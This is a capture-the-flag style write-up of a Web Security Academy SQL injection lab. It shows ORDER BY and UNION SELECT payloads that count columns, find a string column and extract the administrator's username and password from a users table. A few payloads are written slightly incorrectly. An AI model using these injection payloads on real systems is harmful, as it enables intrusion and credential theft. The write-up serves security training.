**SQL Injection — Lab #6 SQL injection UNION attack, retrieving multiple values in a single column**

<img width="1100" height="523" alt="image" src="https://github.com/user-attachments/assets/4e01003e-fe5d-4e6c-add3-0599e325ce15" />

In this Lab Product Category is vulnerable to SQL injection attack.

There is a table called **users** which is hidden. That table contains two columns called **username** and **password**

Goal of this Lab is to retrieves all usernames and passwords and login as administrator.

For performing SQLi UNION attack, we need to know two things.

1. We need to know the number of column in a Table.

2. We need to know the data type of the columns.

Lets access the Lab

As per Lab description Product Category is vulnerable to SQL injection attack.

Lets quickly validate

<img width="1100" height="232" alt="image" src="https://github.com/user-attachments/assets/6332b31c-ba6d-44e9-bfe3-4ac46330be57" />

We got an error.

<img width="1100" height="548" alt="image" src="https://github.com/user-attachments/assets/6085e77b-2d6d-4c99-9ea2-b72f8f6a882e" />

This time there is no error.

**STEP 1>** Need to determine number of columns

***web-security-academy.net/filter?category=Gifts’ ORDER BY 1 --***

<img width="1100" height="586" alt="image" src="https://github.com/user-attachments/assets/8799cd84-6b3c-4b97-8eb3-13cab8c731f4" />

***web-security-academy.net/filter?category=Gifts’ ORDER BY 2 --***

<img width="1100" height="558" alt="image" src="https://github.com/user-attachments/assets/32acfd0b-f400-4a43-a838-ce7198a18b61" />

***web-security-academy.net/filter?category=Gifts’ ORDER BY 3 --***

<img width="1100" height="242" alt="image" src="https://github.com/user-attachments/assets/f8580998-fa46-42ba-81f0-993c18d24747" />

We got an error. So we know that table has two columns.

**SETP 2>** Now we need to determine data types of the columns.

***web-security-academy.net/filter?category=gifts’ UNION SELECT ‘a’, NULL --***

<img width="1100" height="235" alt="image" src="https://github.com/user-attachments/assets/ce601d26-ad54-4e01-9d9b-09d6f276aa90" />

We got an error. It means the 1st column, which is not visible to us don’t have strings data type.

***web-security-academy.net/filter?category=gifts’ UNION SELECT NULL, 1 --***

<img width="1100" height="264" alt="image" src="https://github.com/user-attachments/assets/e2accc52-c515-4993-b114-72923f78a448" />

Again we got an error, so 1st column data type is not integer as well

Lets check for 2nd column.

***web-security-academy.net/filter?category=gifts’ UNION SELECT null, ‘a’ --***

<img width="984" height="624" alt="image" src="https://github.com/user-attachments/assets/42dc4675-f621-4129-988b-4e2bef40bcff" />

No error, means 2nd column has strings data type.

Now we need to get the output of the data from the other tables.

In this lab we are interested in users table to find the username and passwords.

Now, in this lab we have only one column (name of the Items) and we need output from two columns (username and password)

In this case we can perform UNION SQLi to display output one by one.

Our payload will look like this

***' UNION SELECT NULL username from users --***

<img width="1100" height="600" alt="image" src="https://github.com/user-attachments/assets/f18e497f-8fa5-4618-afc7-f03382b52c50" />

We got the username which is administrator

***' UNION SELECT NULL password from users --***

<img width="1100" height="615" alt="image" src="https://github.com/user-attachments/assets/3875bb0e-27bb-4f3f-85a1-ade43aea4c97" />

We got the password.

Lets login to solve the Lab

<img width="1100" height="432" alt="image" src="https://github.com/user-attachments/assets/96610bca-d051-41ef-ae78-93ee5fba7436" />

And Lab is solved.

















